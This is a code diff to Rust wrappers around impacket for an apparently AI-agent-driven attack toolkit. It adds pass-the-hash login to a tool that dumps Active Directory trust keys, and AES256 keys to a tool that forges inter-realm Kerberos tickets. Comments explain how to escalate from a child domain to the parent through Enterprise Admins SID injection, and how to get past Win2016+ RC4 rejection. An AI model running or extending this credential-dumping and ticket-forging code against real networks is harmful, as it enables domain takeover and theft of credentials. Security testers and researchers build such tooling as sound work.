@@ -10,16 +10,26 @@ use crate::ToolOutput;
 
 /// Extract trust keys by dumping secrets for a trusted domain's machine account.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `trusted_domain`
+/// Required args: `domain`, `username`, `dc_ip`, `trusted_domain`
+/// Auth: `password` (plaintext) OR `hash` (NTLM pass-the-hash). At least one
+/// non-empty value required — empty `password` would trigger an interactive
+/// `getpass()` prompt inside impacket-secretsdump and EOF the agent's stdin.
 pub async fn extract_trust_key(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
+    let password = optional_str(args, "password").filter(|s| !s.is_empty());
+    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
     let dc_ip = required_str(args, "dc_ip")?;
     let trusted_domain = required_str(args, "trusted_domain")?;
 
+    if password.is_none() && hash.is_none() {
+        anyhow::bail!(
+            "extract_trust_key requires non-empty 'password' or 'hash' for authentication"
+        );
+    }
+
     let (target_str, extra_args) =
-        credentials::impacket_auth(Some(domain), username, Some(password), None, dc_ip);
+        credentials::impacket_auth(Some(domain), username, password, hash, dc_ip);
 
     let just_dc_user = format!("{trusted_domain}$");
 
@@ -36,11 +46,17 @@ pub async fn extract_trust_key(args: &Value) -> Result<ToolOutput> {
 ///
 /// Required args: `trust_key`, `source_sid`, `source_domain`, `target_sid`,
 ///                `target_domain`
-/// Optional args: `username`, `extra_sid`
+/// Optional args: `username`, `extra_sid`, `aes_key`
 ///
 /// For child-to-parent escalation (same forest), pass `extra_sid` with the
 /// parent domain Enterprise Admins SID (e.g. `S-1-5-21-…-519`).
 /// For cross-forest trusts, omit `extra_sid` — SID filtering blocks RIDs < 1000.
+///
+/// When `aes_key` is supplied, the AES256 trust key is used in addition to the
+/// NT hash. Win2016+ DCs reject RC4-only inter-realm tickets with
+/// `KDC_ERR_TGT_REVOKED`, so the AES path is required for any modern target
+/// forest. impacket-ticketer accepts both flags simultaneously and embeds both
+/// keys in the ticket so RC4-only and AES-only KDCs both validate.
 pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
     let trust_key = required_str(args, "trust_key")?;
     let source_sid = required_str(args, "source_sid")?;
@@ -49,13 +65,22 @@ pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
     let target_domain = required_str(args, "target_domain")?;
     let username = optional_str(args, "username").unwrap_or("Administrator");
     let extra_sid = optional_str(args, "extra_sid");
+    let aes_key = optional_str(args, "aes_key").filter(|s| !s.is_empty());
 
     let spn = format!("krbtgt/{target_domain}");
+    // -nthash expects a 32-char hex NT hash. LLMs frequently pass the
+    // concatenated `LM:NT` form harvested from secretsdump output, which
+    // ticketer rejects with `'Odd-length string'`. Strip to NT half.
+    let nt = credentials::nt_hash_only(trust_key);
 
     let mut cmd = CommandBuilder::new("impacket-ticketer")
-        .flag("-nthash", trust_key)
+        .flag("-nthash", nt)
         .flag("-domain-sid", source_sid)
         .flag("-domain", source_domain);
+
+    if let Some(aes) = aes_key {
+        cmd = cmd.flag("-aesKey", aes);
+    }
 
     if let Some(es) = extra_sid {
         cmd = cmd.flag("-extra-sid", es);
